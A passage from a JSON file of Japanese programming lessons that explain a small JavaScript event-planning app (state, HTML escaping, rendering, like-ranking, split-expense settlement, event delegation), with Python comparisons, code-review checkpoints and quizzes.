という攻撃）ことがあります。\nこのアプリは HTML を文字列で組み立てる作りなので、ユーザーが入力した文字には必ず `esc()` を通しています。\n\n- `s ?? \"\"`：s が null か undefined なら空文字\n- `/[&<>\"']/g`：正規表現。「この 5 つの記号のどれか」を、`g`（全部）探す\n- `{...}[c]`：見つかった記号 `c` を、その場で作った対応表から引いて置き換える\n\n### today / fmtDate：日付の形を整える\n\n```javascript\ntoday()                 // \"2026-11-17\"（今日を「年-月-日」の形で）\nfmtDate(\"2027-09-01\")   // \"2027/9/1\"（表示用に）\n```\n\n- `padStart(2, \"0\")`：1 桁の月日を `09` のように 2 桁にする\n- `getMonth() + 1`：JavaScript の月は **0 から始まる**（1 月が 0）ので 1 を足している。よくある落とし穴\n- `+m`：文字列 `\"09\"` の前に `+` を付けると数値 `9` になる（先頭の 0 が消える）\n\n### yen：金額の表示\n\n```javascript\nyen(1234.5)   // \"¥1,235\"\n```\n\n四捨五入して、`toLocaleString(\"ja-JP\")` で 3 桁ごとにカンマを入れています。\n\n### byNew / memberOpts：並べ替えと選択肢\n\n- `byNew`：`sort` に渡す比べ方の関数。作成日時の **新しい順**（`b - a` で大きい方が先）\n- `memberOpts`：メンバー名から `<option>` の HTML を作る。今の自分（`sel`）を最初から選ばれた状態にする\n\n### TABS：タブの一覧\n\n`[キー, アイコン, 表示名]` の配列の配列です。ここに 1 行足せばタブが増える（画面の関数も必要）ように、データとして持っています。\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `const S = {...}` | 辞書 `S = {...}`（中身は後から変えられる） |\n| `s ?? \"\"` | `s if s is not None else \"\"` |\n| `s.replace(/[&<>\"']/g, ...)` | `html.escape(s)`（Python の標準ライブラリにある） |\n| `` `${y}/${m}` `` | `f\"{y}/{m}\"` |\n| `String(n).padStart(2, \"0\")` | `str(n).zfill(2)` または `f\"{n:02d}\"` |\n| `Math.round(n).toLocaleString(\"ja-JP\")` | `f\"{round(n):,}\"` |\n| `getMonth()` が 0 始まり | Python の `date.month` は 1 始まり（JavaScript だけの注意点） |\n\n## 🔑 キーワード\n\n- **状態（state）**：アプリの「今」を表すデータ。画面はここから作られる\n- **エスケープ（無害化）**：記号を、ただの文字として表示される形に置き換えること\n- **XSS（クロスサイトスクリプティング）**：入力に紛れ込ませたプログラムを、他の人の画面で動かす攻撃\n- **アロー関数**：`x => ...` の短い関数の書き方\n- **null 合体演算子（??）**：左が null / undefined のときだけ右を使う\n- **比較関数**：`sort` に渡す「どちらを先にするか」を決める関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ ユーザーの入力を画面に出すときに `esc()` を通している\n- ✅ localStorage が使えない環境でも止まらない\n- ⚠️ 1 行に詰め込んだ関数が多く、読みにくい。理解するときは、例を入れて結果を書き出してみるとよい\n- ⚠️ `fmtDate` は「年-月-日」の形でない文字列が来ると、**そのまま返す**。返した値を `esc()` せずに画面に出している場所があり、データベースに変な値が入ると表示が崩れる（悪用される）可能性がある（6・7 ページ目の写真の扱いと合わせて注意点）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「S はアプリの状態をまとめたオブジェクトで、設定・今のタブ・自分の名前と、5 種類のデータの配列が入っています。画面は S だけを見て描くルールです。\nそのほか、記号を無害化して XSS を防ぐ esc、日付を整える today と fmtDate、金額を ¥ とカンマ付きにする yen などの小さな関数を用意しています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`esc('<b>')` の結果は？",
      "choices": [
       "<b>",
       "&lt;b&gt;",
       "b"
      ],
      "answer": 1,
      "explain": "< と > を、ただの文字として表示される形に置き換えます。"
     },
     {
      "question": "JavaScript で 2026 年 11 月の日付に対して `d.getMonth()` を呼ぶと？",
      "choices": [
       "11",
       "10",
       "12"
      ],
      "answer": 1,
      "explain": "月は 0 から数えるので、1 を足して使う必要があります。"
     },
     {
      "question": "`fmtDate(\"2027-09-01\")` の結果は？",
      "choices": [
       "\"2027/9/1\"",
       "\"2027/09/01\"",
       "\"9/1\""
      ],
      "answer": 0,
      "explain": "+m で \"09\" が数値の 9 になり、先頭の 0 が消えます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-04-state-helpers"
  },
  {
   "title": "描画（1）― render とホーム・タスク・予定・ログの画面",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 2,
   "series": "popup2027",
   "part": 5,
   "concepts": [
    "dom_ui",
    "higher_order",
    "collections",
    "strings",
    "conditionals"
   ],
   "lessons": [
    "20-javascript/05-array-methods",
    "20-javascript/06-dom-events",
    "20-javascript/02-control-flow",
    "20-javascript/04-functions-arrow"
   ],
   "summary": "状態 S から HTML の文字列を組み立てて画面を描き直す render と、4 つの画面の作り方。",
   "body": "## 📄 解説するコード（165〜249 行目・抜粋）\n\n```javascript\n// ---------- 描画 ----------\nfunction render() {\n  document.title = S.settings.title;\n  document.getElementById(\"title\").textContent = S.settings.title;\n  document.getElementById(\"meBtn\").textContent = S.me ? `👤 ${S.me}` : \"名前を選ぶ\";\n  document.getElementById(\"nav\").innerHTML = TABS.map(([k, i, l]) => `<button data-tab=\"${k}\" class=\"${S.tab === k ? \"on\" : \"\"}\"><span>${i}</span>${l}</button>`).join(\"\");\n  const banner = S.error ? `<div class=\"banner\">${esc(S.error)}</div>` : store.live ? \"\" : `<div class=\"banner\">お試しモード：データはこの端末だけに保存されています（Firebase 未接続）</div>`;\n  document.getElementById(\"main\").innerHTML = banner + (VIEWS[S.tab] || VIEWS.home)();\n}\n\nconst VIEWS = {\n  home() {\n    const days = Math.ceil((new Date(S.settings.date + \"T00:00:00\") - new Date(today() + \"T00:00:00\")) / 864e5);\n    const total = S.tasks.length, done = S.tasks.filter(t => t.status === \"done\").length;\n    const next = S.milestones.filter(m => !m.done).sort((a, b) => (a.date || \"\").localeCompare(b.date || \"\")).slice(0, 3);\n    const mine = S.tasks.filter(t => t.assignee === S.me && t.status !== \"done\").sort((a, b) => (a.due || \"9\").localeCompare(b.due || \"9\")).slice(0, 5);\n    const logs = [...S.logs].sort(byNew).slice(0, 3);\n    return `\n    <div class=\"card\"><h2>本番まで（${fmtDate(S.settings.date)}）</h2>\n      <div class=\"count\"><b>${days >= 0 ? days : 0}</b><span>日</span></div></div>\n    <div class=\"card\"><h2>タスク進捗</h2>\n      <div class=\"row\"><span>${done} / ${total} 完了</span><span class=\"mini\">${total ? Math.round(done / total * 100) : 0}%</span></div>\n      <div class=\"bar\"><i style=\"width:${total ? done / total * 100 : 0}%\"></i></div></div>\n    ...（自分のやること・次の予定・最近のログ・設定ボタン）`;\n  },\n\n  tasks() {\n    const order = { doing: 0, todo: 1, done: 2 };\n    let list = [...S.tasks];\n    if (S.filter !== \"all\") list = list.filter(t => t.assignee === S.filter);\n    list.sort((a, b) => (order[a.status] - order[b.status]) || (a.due || \"9\").localeCompare(b.due || \"9\"));\n    const label = { todo: \"未着手\", doing: \"進行中\", done: \"完了\" };\n    return `\n    <form class=\"add\" data-form=\"tasks\">\n      <input class=\"grow\" name=\"title\" placeholder=\"やること\" required>\n      <select name=\"assignee\">${memberOpts(S.me, true)}</select>\n      <input type=\"date\" name=\"due\">\n      <button class=\"btn\">追加</button>\n    </form>\n    <div class=\"list\">${list.map(t => `\n      <div class=\"item ${t.status === \"done\" ? \"done\" : \"\"}\">\n        <button class=\"chip s-${t.status}\" data-cycle=\"${t.id}\">${label[t.status]}</button>\n        <div class=\"body\">${esc(t.title)}<div class=\"meta\">...</div></div>\n        <button class=\"x\" data-del=\"tasks:${t.id}\">×</button>\n      </div>`).join(\"\") || `<div class=\"empty\">タスクはまだありません</div>`}</div>`;\n  },\n\n  milestones() { /* 予定：日付順。過ぎた予定に class=\"past\" */ },\n  logs() { /* ログ：日付の新しい順 */ },\n  // ideas() と expenses() は 6 ページ目\n};\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**状態 `S` から画面を組み立てる** 部分です。各画面は「HTML の文字列を返す関数」になっていて、`render()` がそれを `#main` の箱に入れます。\n\n## 🗺️ 全体の流れ\n\n1. どこかで `S` が変わると `render()` が呼ばれる\n2. `render()` がタイトル・自分の名前・下のタブを書き換える\n3. 今のタブ（`S.tab`）に対応する画面の関数（`VIEWS.home` など）を呼び、HTML の文字列をもらう\n4. その文字列を `#main` に `innerHTML` で入れる → 画面が丸ごと新しくなる\n\n## 🔍 ブロックごとの解説\n\n### render：画面を丸ごと描き直す\n\n```javascript\ndocument.getElementById(\"main\").innerHTML = banner + (VIEWS[S.tab] || VIEWS.home)();\n```\n\n- `VIEWS[S.tab]`：`S.tab` が `\"tasks\"` なら `VIEWS.tasks`（画面の関数）を取り出す\n- `|| VIEWS.home`：知らないタブ名なら、ホームにする\n- 最後の `()` で関数を呼び、返ってきた HTML 文字列を箱に入れる\n\n変わった所だけを直すのではなく **毎回全部作り直す** ので、仕組みがとても単純です。小さなアプリならこれで十分速く動きます。\n\n### 下のタブを作る\n\n```javascript\nTABS.map(([k, i, l]) => `<button data-tab=\"${k}\" class=\"${S.tab === k ? \"on\" : \"\"}\">...`).join(\"\")\n```\n\n- `([k, i, l]) =>`：`[\"tasks\", \"✅\", \"タスク\"]` を 3 つの変数に **分割代入** して受け取る\n- 今のタブだけ `class=\"on\"`（色が付く）\n- `data-tab=\"tasks\"`：ボタンに付けた **メモ書き**。押されたときに、どのタブか分かる（7 ページ目）\n- `map` で作った文字列の配列を、`join(\"\")` で 1 つの文字列につなげる\n\n### ホーム：数字を計算して並べる\n\n```javascript\nconst days = Math.ceil((new Date(S.settings.date + \"T00:00:00\") - new Date(today() + \"T00:00:00\")) / 864e5);\n```\n\n日付どうしを引き算すると **ミリ秒（1000 分の 1 秒）** の差が出ます。`864e5` は `86400000`（1 日のミリ秒）なので、割ると日数になります。たとえば今日が 2026-11-17 なら、2027-09-01 まで **288 日** です。\n\n```javascript\nconst mine = S.tasks.filter(t => t.assignee === S.me && t.status !== \"done\")\n  .sort((a, b) => (a.due || \"9\").localeCompare(b.due || \"9\")).slice(0, 5);\n```\n\nメソッドチェーンを 1 段ずつ読みます。\n\n1. `filter`：自分が担当 **かつ** 完了していないタスクだけ\n2. `sort`：締め切りの早い順。締め切りが無いものは `\"9\"` として扱い、**一番後ろ** へ（日付の文字列 \"2027-...\" より \"9\" の方が後に来る）\n3. `slice(0, 5)`：先頭の 5 件だけ\n\n### タスク：並べ替えの 2 段階ルール\n\n```javascript\nconst order = { doing: 0, todo: 1, done: 2 };\nlist.sort((a, b) => (order[a.status] - order[b.status]) || (a.due || \"9\").localeCompare(b.due || \"9\"));\n```\n\n1. まず状態で並べる：**進行中 → 未着手 → 完了**\n2. 状態が同じなら（引き算が 0 になると `||` の右に進む）、締め切りの早い順\n\n`sort` の比較関数は「マイナスなら a が先、プラスなら b が先、0 なら同じ」というルールです。\n\n### 一覧が空のときの表示\n\n```javascript\n${list.map(t => `...`).join(\"\") || `<div class=\"empty\">タスクはまだありません</div>`}\n```\n\n1 件も無ければ `join(\"\")` は空文字になり、空文字は「偽」なので `||` の右側（「まだありません」）が使われます。\n\n### 予定・ログ\n\n- **予定**：日付の早い順。今日より前の予定には `class=\"past\"` を付けて、CSS で枠の色を変える。チェックボックスで完了にできる\n- **ログ**：日付の新しい順。同じ日付なら作成日時の新しい順（`byNew`）\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `VIEWS = { home() {...}, tasks() {...} }` | 関数を値に持つ辞書 `VIEWS = {\"home\": home, \"tasks\": tasks}` |\n| `VIEWS[S.tab] \\|\\| VIEWS.home` | `VIEWS.get(S[\"tab\"], home)` |\n| `list.map(t => `...`).join(\"\")` | `\"\".join(f\"...\" for t in lst)` |\n| `a.localeCompare(b)` | 文字列の比較（`sorted(key=...)` で並べる） |\n| `arr.slice(0, 5)` | `arr[:5]` |\n| `innerHTML = 文字列` | （Python には無い。HTML の箱に文字列を流し込む、ブラウザだけの機能） |\n\n## 🔑 キーワード\n\n- **render（描画）**：状態から画面を作り直す処理\n- **テンプレートリテラル**：`` `...${式}...` `` の、値を埋め込める文字列\n- **innerHTML**：要素の中身を HTML の文字列で書き換えるプロパティ\n- **data 属性**：`data-tab=\"...\"` のように、HTML の要素に付けるメモ書き\n- **メソッドチェーン**：`.filter().sort().slice()` のように処理をつなげる書き方\n- **比較関数**：`sort` に渡す「どちらを先にするか」を決める関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 画面が「S → 文字列 → innerHTML」の一方通行で作られていて、仕組みが単純で追いやすい\n- ✅ ユーザーが入力したタイトルやログは `esc()` を通している\n- ⚠️ `innerHTML` で毎回全部作り直すので、**入力中のフォームが消えてしまう** 問題がある。8 ページ目の `rerender` でその対策をしている\n- ⚠️ `fmtDate(m.date)` や `t.status` などは `esc()` を通していない。普通に使う分には問題ないが、データベースに直接おかしな値が書き込まれると、表示が崩れたり悪用されたりする余地がある\n- ⚠️ 日数の計算は端末の時計とタイムゾーンを使う。海外の端末では 1 日ずれることがある（日本で使う分には問題なし）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「render は状態 S をもとに画面を全部作り直す関数で、今のタブに対応する VIEWS の関数が返す HTML の文字列を、main の箱に innerHTML で入れています。\nホームでは本番までの日数を日付の引き算で出したり、自分の未完了タスクを filter・sort・slice で 5 件取り出したりしています。\nタスク一覧は、進行中・未着手・完了の順、同じ状態なら締め切りが早い順に並べています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`S.tab` が \"ideas\" のとき、render() が呼ぶ画面の関数は？",
      "choices": [
       "VIEWS.home",
       "VIEWS.ideas",
       "何も呼ばない"
      ],
      "answer": 1,
      "explain": "VIEWS[S.tab] で、タブ名と同じ名前の関数を取り出します。"
     },
     {
      "question": "タスク一覧で、締め切りが無いタスクはどこに並ぶ？",
      "choices": [
       "同じ状態のタスクの中で一番後ろ",
       "一番先頭",
       "表示されない"
      ],
      "answer": 0,
      "explain": "締め切りが無いものは \"9\" として比べるので、日付より後になります。"
     },
     {
      "question": "`[].map(x => x).join(\"\") || \"なし\"` の結果は？",
      "choices": [
       "\"\"",
       "\"なし\"",
       "[]"
      ],
      "answer": 1,
      "explain": "空の配列を join すると空文字になり、空文字は偽なので || の右側が使われます。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-05-render-views"
  },
  {
   "title": "描画（2）― アイデアの「いいね」とお金の精算計算",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 6,
   "concepts": [
    "higher_order",
    "collections",
    "operators",
    "dom_ui"
   ],
   "lessons": [
    "20-javascript/05-array-methods",
    "20-javascript/03-arrays-objects",
    "10-python/04-lists-and-dicts"
   ],
   "summary": "いいねの多い順に並ぶアイデア一覧と、立て替えた支出から「誰がいくら払う・もらうか」を計算するお金の画面。",
   "body": "## 📄 解説するコード（251〜291 行目・抜粋）\n\n```javascript\n  ideas() {\n    const list = [...S.ideas].sort((a, b) => ((b.likes || []).length - (a.likes || []).length) || byNew(a, b));\n    return `\n    <form class=\"add\" data-form=\"ideas\">\n      <textarea class=\"grow\" name=\"text\" placeholder=\"思いついたこと、なんでも（写真だけでもOK）\">${esc(S.ideaDraft || \"\")}</textarea>\n      ${S.ideaPhoto ? `<div class=\"grow photo-prev\"><img src=\"${S.ideaPhoto}\" alt=\"\"><button type=\"button\" class=\"x\" data-act=\"clearPhoto\">×</button></div>` : \"\"}\n      <label class=\"btn ghost\">📷 写真<input type=\"file\" accept=\"image/*\" data-photo hidden></label>\n      <button class=\"btn\" ${S.busy ? \"disabled\" : \"\"}>${S.busy ? \"処理中…\" : \"投稿\"}</button>\n    </form>\n    <div class=\"list\">${list.map(i => { const likes = i.likes || []; return `\n      <div class=\"item\"><div class=\"body\">${i.text ? esc(i.text) : \"\"}${i.photo ? `<img class=\"photo\" src=\"${i.photo}\" alt=\"\" data-zoom=\"${i.id}\">` : \"\"}<div class=\"meta\">${esc(i.author)}</div></div>\n      <button class=\"like ${likes.includes(S.me) ? \"on\" : \"\"}\" data-like=\"${i.id}\" title=\"${esc(likes.join(\"、\"))}\">♥ ${likes.length}</button>\n      <button class=\"x\" data-del=\"ideas:${i.id}\">×</button></div>`; }).join(\"\") || `<div class=\"empty\">アイデアはまだありません</div>`}</div>`;\n  },\n\n  expenses() {\n    const members = S.settings.members;\n    const total = S.expenses.reduce((s, e) => s + (+e.amount || 0), 0);\n    const share = members.length ? total / members.length : 0;\n    const paid = Object.fromEntries(members.map(m => [m, 0]));\n    S.expenses.forEach(e => { if (e.paidBy in paid) paid[e.paidBy] += +e.amount || 0; });\n    const list = [...S.expenses].sort((a, b) => (b.date || \"\").localeCompare(a.date || \"\") || byNew(a, b));\n    return `\n    <form class=\"add\" data-form=\"expenses\"> ...（何に使った？・金額・立て替えた人・日付）... </form>\n    <div class=\"card\"><h2>合計 ${yen(total)}（1人あたり ${yen(share)}）</h2>\n      <table><tr><th>名前</th><th class=\"num\">立替</th><th class=\"num\">精算</th></tr>\n      ${members.map(m => { const d = paid[m] - share; return `<tr><td>${esc(m)}</td><td class=\"num\">${yen(paid[m])}</td>\n        <td class=\"num\" style=\"color:${d > 0.5 ? \"var(--ok)\" : d < -0.5 ? \"var(--accent)\" : \"var(--sub)\"}\">${d > 0.5 ? \"+\" + yen(d) + \" もらう\" : d < -0.5 ? yen(-d) + \" 払う\" : \"±0\"}</td></tr>`; }).join(\"\")}\n      </table></div>\n    <div class=\"list\"> ...（支出の一覧：日付の新しい順）... </div>`;\n  },\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**アイデア** と **お金** の 2 つの画面です。アイデアは「いいね」の多い順に並び、お金は立て替えた支出の記録から **「誰がいくら払えば・もらえば公平になるか」** を自動で計算します。\n\n## 🗺️ 全体の流れ\n\n**アイデア**\n1. いいねの多い順、同じなら新しい順に並べる\n2. 投稿フォーム（文字・写真）と、投稿の一覧を作る\n3. 自分がいいね済みなら ♥ ボタンに色を付ける\n\n**お金**\n1. 支出の合計を出す\n2. 合計をメンバーの人数で割って、1 人あたりの負担額を出す\n3. メンバーごとに、立て替えた金額を集計する\n4. 「立て替えた金額 − 1 人あたり」で、もらう人・払う人を決めて表にする\n\n## 🔍 ブロックごとの解説\n\n### いいねの仕組み：名前の配列\n\n```javascript\nconst likes = i.likes || [];\nlikes.includes(S.me)   // 自分がいいね済みか\nlikes.length           // いいねの数\n```\n\nいいねは「数」ではなく **いいねした人の名前の配列**（例：`[\"メンバーA\", \"メンバーC\"]`）で持っています。\nそのおかげで、**同じ人が 2 回いいねできない**・**誰がいいねしたか分かる**（ボタンにマウスを乗せると `title` に名前が出る）という 2 つのことが実現できています。\n\n### いいねの多い順に並べる\n\n```javascript\n[...S.ideas].sort((a, b) => ((b.likes || []).length - (a.likes || []).length) || byNew(a, b))\n```\n\n- `[...S.ideas]`：元の配列を **コピーしてから** 並べ替える（`sort` は元の配列を書き換えてしまうため）\n- `b - a` の順なので **多い順**。同じ数なら（0 になって）`byNew` で新しい順\n\n### 写真の下書き\n\n`S.ideaPhoto` に写真が入っていればプレビューを表示し、`S.busy`（写真の縮小中）なら投稿ボタンを押せなくします。写真の縮小は 8 ページ目です。\n\n### お金：精算の計算\n\n例で追ってみます。メンバーは A・B・C の 3 人、A が 9,000 円、B が 3,000 円を立て替えたとします。\n\n```javascript\nconst total = S.expenses.reduce((s, e) => s + (+e.amount || 0), 0);   // 12000\nconst share = members.length ? total / members.length : 0;             // 4000\nconst paid = Object.fromEntries(members.map(m => [m, 0]));             // {A: 0, B: 0, C: 0}\nS.expenses.forEach(e => { if (e.paidBy in paid) paid[e.paidBy] += +e.amount || 0; });\n                                                                        // {A: 9000, B: 3000, C: 0}\n```\n\n| 名前 | 立替 `paid[m]` | `d = paid[m] - share` | 表示 |\n|---|---|---|---|\n| A | 9,000 | +5,000 | **+¥5,000 もらう** |\n| B | 3,000 | −1,000 | **¥1,000 払う** |\n| C | 0 | −4,000 | **¥4,000 払う** |\n\nB と C が払う合計（5,000）と、A がもらう額（5,000）が一致していて、全員の負担がちょうど 4,000 円ずつになります。\n\n### 読み解きのポイント\n\n- `reduce((s, e) => s + ..., 0)`：0 から始めて、支出を 1 件ずつ足していく（JavaScript コースの「map・filter・reduce」）\n- `+e.amount || 0`：`+` で文字列を数値にし、数値にできなければ（NaN は偽）0 にする\n- `Object.fromEntries([[A, 0], [B, 0]])`：`{A: 0, B: 0}` を作る。Python の `dict(...)` にあたる\n- `if (e.paidBy in paid)`：今のメンバーにいない名前（名前を変える前の古い記録など）は集計しない\n- `d > 0.5` / `d < -0.5`：割り算の端数（3,333.33… 円など）で「±0」が「1 円払う」にならないよう、**0.5 円の幅を持たせて** 判定している\n\n### 三項演算子の連続\n\n```javascript\nd > 0.5 ? \"+\" + yen(d) + \" もらう\" : d < -0.5 ? yen(-d) + \" 払う\" : \"±0\"\n```\n\n`条件1 ? A : 条件2 ? B : C` は、`if 条件1: A elif 条件2: B else: C` と同じです。\n\n## 🐍 Python と比べると\n\n```python\ntotal = sum(int(e[\"amount\"] or 0) for e in expenses)\nshare = total / len(members) if members else 0\npaid = {m: 0 for m in members}\nfor e in expenses:\n    if e[\"paidBy\"] in paid:\n        paid[e[\"paidBy\"]] += int(e[\"amount\"] or 0)\nfor m in members:\n    d = paid[m] - share\n    label = f\"+{d:,.0f} もらう\" if d > 0.5 else f\"{-d:,.0f} 払う\" if d < -0.5 else \"±0\"\n```\n\n| JavaScript | Python |\n|---|---|\n| `arr.reduce((s, e) => s + x, 0)` | `sum(x for e in arr)` |\n| `Object.fromEntries(members.map(m => [m, 0]))` | `{m: 0 for m in members}` |\n| `\"name\" in obj` | `\"name\" in dict` |\n| `[...arr].sort(...)` | `sorted(arr, key=...)`（元を変えない） |\n\n## 🔑 キーワード\n\n- **割り勘の精算**：全員の負担を同じにするための「払う・もらう」の計算\n- **reduce**：配列を 1 つの値にまとめるメソッド\n- **Object.fromEntries**：`[キー, 値]` の配列からオブジェクトを作る\n- **三項演算子**：`条件 ? A : B` の、短い if の書き方\n- **非破壊的な並べ替え**：`[...arr]` でコピーしてから並べ、元の配列を変えないこと\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ いいねを名前の配列で持つことで、二重いいねを防いでいる\n- ✅ 精算の判定に 0.5 円の幅を持たせて、割り切れない金額でも表示がおかしくならない\n- ⚠️ 写真（`i.photo`）は `esc()` を通さずに `src=\"...\"` に入れている。アプリが作った画像なら安全だが、データベースに直接おかしな文字列を書き込まれると、そこからプログラムを動かされる余地がある（ログインが無いので、Firestore のルールで書き込みを制限することが大事）\n- ⚠️ 支出は「全員で均等に割る」前提。「この支出は A と B だけで割る」はできない\n- ⚠️ メンバーの名前を変えると、変更前の名前で記録した支出は `in paid` に当たらず、集計から外れる（表の合計と立替の合計が合わなくなる）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「アイデアの画面は、いいねした人の名前を配列で持っていて、その数が多い順に並べています。名前で持つので同じ人は 2 回いいねできません。\nお金の画面は、支出の合計をメンバー数で割って 1 人あたりを出し、各自が立て替えた金額との差がプラスならもらう、マイナスなら払う、と表示しています。端数で変な表示にならないよう 0.5 円の幅を持たせています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "4 人のメンバーで、A が 8,000 円だけ立て替えた。B の表示は？",
      "choices": [
       "±0",
       "¥2,000 払う",
       "+¥2,000 もらう"
      ],
      "answer": 1,
      "explain": "1 人あたり 2,000 円。B は 0 円しか払っていないので 2,000 円払います（A は 6,000 円もらう）。"
     },
     {
      "question": "いいねを「数」ではなく「名前の配列」で持っている理由として正しいのは？",
      "choices": [
       "同じ人が 2 回いいねするのを防ぎ、誰がいいねしたかも分かるから",
       "数字はデータベースに保存できないから",
       "並べ替えができないから"
      ],
      "answer": 0,
      "explain": "likes.includes(S.me) で、自分がいいね済みかを判定できます。"
     },
     {
      "question": "`[...S.ideas].sort(...)` の `[...S.ideas]` は何のため？",
      "choices": [
       "アイデアを 2 倍に増やすため",
       "元の配列を書き換えないよう、コピーしてから並べ替えるため",
       "写真だけを取り出すため"
      ],
      "answer": 1,
      "explain": "sort は元の配列を並べ替えてしまうので、コピーに対して行っています。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-06-ideas-expenses"
  },
  {
   "title": "イベント処理 ― クリックと送信を 1 か所で受け止める仕組み",
   "language": "JavaScript",
   "date": "2026-11-17",
   "level": 3,
   "series": "popup2027",
   "part": 7,
   "concepts": [
    "dom_ui",
    "higher_order",
    "conditionals",
    "async"
   ],
   "lessons": [
    "20-javascript/06-dom-events",
    "20-javascript/04-functions-arrow",
    "20-javascript/02-control-flow",
    "20-javascript/07-promise-async"
   ],
   "summary": "画面全体のクリックと送信を document でまとめて受け止め、ボタンの data 属性を見て何をするか決める（イベント委任）。モーダルも担当。",
   "body": "## 📄 解説するコード（293〜360 行目・抜粋）\n\n```javascript\n// ---------- モーダル ----------\nfunction showWho() {\n  document.getElementById(\"modal\").innerHTML = `<div class=\"modal\"><div class=\"card\"><h2>あなたは誰？</h2>\n    <div class=\"who\">${S.settings.members.map(m => `<button data-me=\"${esc(m)}\">${esc(m)}</button>`).join(\"\")}</div>\n    <p class=\"mini\">この端末に記憶されます。右上からいつでも変更できます。</p></div></div>`;\n}\nfunction showSettings() { /* タイトル・本番の日付・メンバー名を入力するフォームを出す */ }\nconst closeModal = () => document.getElementById(\"modal\").innerHTML = \"\";\n\n// ---------- イベント ----------\ndocument.addEventListener(\"click\", e => {\n  const z = e.target.closest(\"[data-zoom]\");\n  if (z) { document.getElementById(\"modal\").innerHTML = `<div class=\"modal lightbox\" data-act=\"close\"><img src=\"${z.src}\" alt=\"\"></div>`; return; }\n  if (e.target.closest(\".lightbox\")) return closeModal();\n  const t = e.target.closest(\"button,input[type=checkbox]\"); if (!t) return;\n  const d = t.dataset;\n  if (d.tab) { S.tab = d.tab; lsSet(\"pu-tab\", d.tab); render(); scrollTo(0, 0); }\n  else if (t.id === \"meBtn\") showWho();\n  else if (d.me) { S.me = d.me; lsSet(\"pu-me\", d.me); closeModal(); render(); }\n  else if (d.act === \"settings\") showSettings();\n  else if (d.act === \"close\") closeModal();\n  else if (d.act === \"clearPhoto\") { S.ideaPhoto = null; render(); }\n  else if (d.filter) { S.filter = d.filter; render(); }\n  else if (d.cycle) { const x = S.tasks.find(k => k.id === d.cycle); if (x) store.update(\"tasks\", x.id, { status: { todo: \"doing\", doing: \"done\", done: \"todo\" }[x.status] || \"todo\" }); }\n  else if (d.toggle) { const x = S.milestones.find(k => k.id === d.toggle); if (x) store.update(\"milestones\", x.id, { done: !x.done }); }\n  else if (d.like) {\n    if (!S.me) return showWho();\n    const x = S.ideas.find(k => k.id === d.like); if (!x) return;\n    const likes = x.likes || [];\n    store.update(\"ideas\", x.id, { likes: likes.includes(S.me) ? likes.filter(n => n !== S.me) : [...likes, S.me] });\n  }\n  else if (d.del) { const [col, id] = d.del.split(\":\"); if (confirm(\"削除しますか？\")) store.remove(col, id); }\n});\n\ndocument.addEventListener(\"submit\", e => {\n  const f = e.target.closest(\"form[data-form]\"); if (!f) return;\n  e.preventDefault();\n  const v = Object.fromEntries(new FormData(f));\n  const col = f.dataset.form;\n  if (col === \"settings\") { /* 設定を保存して閉じる */ return; }\n  if (!S.me) return showWho();\n  const author = S.me;\n  if (col === \"tasks\") store.add(col, { title: v.title.trim(), assignee: v.assignee, due: v.due, status: \"todo\", author });\n  if (col === \"milestones\") store.add(col, { title: v.title.trim(), date: v.date, done: false, author });\n  if (col === \"logs\") store.add(col, { text: v.text.trim(), date: v.date || today(), author });\n  if (col === \"ideas\") { /* 文字か写真が必要。失敗したら alert */ }\n  if (col === \"expenses\") store.add(col, { item: v.item.trim(), amount: +v.amount, paidBy: v.paidBy, date: v.date || today(), author });\n  pending = false; render();\n});\n```\n\n## 🧭 ひとことで言うと\n\n**JavaScript** で書かれた、**ボタンを押した・フォームを送信した、という操作（イベント）を受け止めて、データを変える** 部分です。ボタン 1 つ 1 つに処理を付けるのではなく、**ページ全体で 1 か所だけ** 受け止めているのが特徴です。\n\n## 🗺️ 全体の流れ\n\n**クリックされたとき**\n1. ページ全体（`document`）でクリックを受け取る\n2. 押された場所から一番近いボタンを探す（`closest`）\n3. ボタンの data 属性（`data-tab`・`data-cycle` など）を見て、何をするか決める\n4. 画面の切り替えなら `S` を変えて `render()`、データの変更なら `store.update` などを呼ぶ\n\n**フォームが送信されたとき**\n1. ページの再読み込みを止める（`preventDefault`）\n2. フォームの入力値をまとめて取り出す\n3. `data-form` の値（tasks など）に応じて `store.add` で保存する\n\n## 🔍 ブロックごとの解説\n\n### イベント委任：1 か所でまとめて受け止める\n\n```javascript\ndocument.addEventListener(\"click\", e => { ... });\n```\n\nこのアプリは `render()` のたびに画面を作り直すので、ボタンも毎回新しくなります。ボタンごとに処理を付けると、描き直すたびに付け直しが必要です。\nそこで、**ページ全体（document）に 1 つだけ** 処理を付け、クリックが「泡のように上に伝わってくる」性質（バブリング）を利用して受け止めています。これを **イベント委任** と呼びます。\n\n### closest と dataset：何が押されたかを知る\n\n```javascript\nconst t = e.target.closest(\"button,input[type=checkbox]\");\nconst d = t.dataset;\n```\n\n- `e.target`：実際にクリックされた要素（ボタンの中のアイコンの場合もある）\n- `closest(...)`：そこから外側へたどって、一番近いボタン（かチェックボックス）を探す\n- `dataset`：`data-tab=\"tasks\"` のような data 属性を `d.tab` で読めるようにしたもの\n\n5 ページ目で描いたボタンには、それぞれ data 属性が付いていました。\n\n| 